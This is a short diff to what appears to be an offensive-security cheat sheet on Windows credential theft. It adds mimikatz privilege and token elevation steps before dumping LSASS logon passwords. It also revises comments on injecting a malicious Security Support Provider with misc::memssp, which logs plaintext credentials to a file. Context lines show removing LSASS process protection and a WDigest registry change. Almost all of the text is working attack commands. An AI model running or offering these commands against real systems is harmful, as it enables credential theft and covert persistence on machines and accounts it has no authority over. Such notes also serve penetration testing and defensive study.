@@ -74,16 +74,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   mimikatz # !processprotect /process:lsass.exe /remove
 
   # Finally run the logonpasswords function to dump lsass
+  mimikatz # privilege::debug    
+  mimikatz # token::elevate
   mimikatz # sekurlsa::logonpasswords
   ```
 
-- LSA is running as virtualized process (LSAISO) by Credential Guard
+- LSA is running as virtualized process (LSAISO) by **Credential Guard**
   ```powershell
   # Check if a process called lsaiso.exe exists on the running processes
   tasklist |findstr lsaiso
 
-  # If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
-  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  # Lets inject our own malicious Security Support Provider into memory
+  # require mimilib.dll in the same folder
   mimikatz # misc::memssp
 
   # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
